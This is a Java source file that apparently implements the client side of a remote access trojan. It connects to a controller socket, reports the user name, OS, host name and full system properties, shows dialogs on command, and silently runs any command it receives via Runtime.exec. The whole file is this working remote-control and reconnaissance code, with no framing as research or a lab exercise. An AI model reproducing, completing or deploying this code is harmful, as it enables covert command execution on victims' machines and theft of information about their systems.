/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package client;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Map;
import java.util.Properties;
import javax.swing.JOptionPane;
import org.apache.commons.codec.binary.Hex;

/**
 *
 * @author Lee
 */
public class Client {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws Exception {
        Socket st = new Socket("127.0.0.1", 1604);
        BufferedReader r = new BufferedReader(new InputStreamReader(st.getInputStream()));
        PrintWriter p = new PrintWriter(st.getOutputStream());

        while (true) {
            String s = r.readLine();
            new Thread() {
                @Override
                public void run() {
                    String[] ar = s.split("\\|");
                    if (s.startsWith("HALLO")) {
                        String str = "";
                        try {
                            str = InetAddress.getLocalHost().getHostName();
                        } catch (Exception e) {
                        }
                        p.println("info|" + s.split("\\|")[1] + "|" + System.getProperty("user.name") + "|" + System.getProperty("os.name") + "|" + str);
                        p.flush();
                    }
                    if (s.startsWith("msg")) {
                        String text = fromHex(ar[1]);
                        String title = ar[2];
                        int i = Integer.parseInt(ar[3]);
                        JOptionPane.showMessageDialog(null, text, title, i);
                    }
                    if (s.startsWith("execute")) {
                        String cmd = ar[1];
                        try {
                            Runtime.getRuntime().exec(cmd);
                        } catch (Exception e) {
                        }
                    }
                    if (s.equals("getsystem")) {
                        StringBuilder sb = new StringBuilder();
                        for (Object o : System.getProperties().entrySet()) {
                            Map.Entry e = (Map.Entry) o;
                            sb.append("\n" + e.getKey() + "|" + e.getValue());

                        }
                        p.println("systeminfos|" + toHex(sb.toString().substring(1)));
                        p.flush();
                    }
                }

            }.start();
        }
    }

    static String toHex(String input) {
        return new String(Hex.encodeHex(input.getBytes()));
    }

    static String fromHex(String input) {
        try {
            return new String(Hex.decodeHex(input.toCharArray()));
        } catch (Exception e) {
            return new String();
        }
    }
}
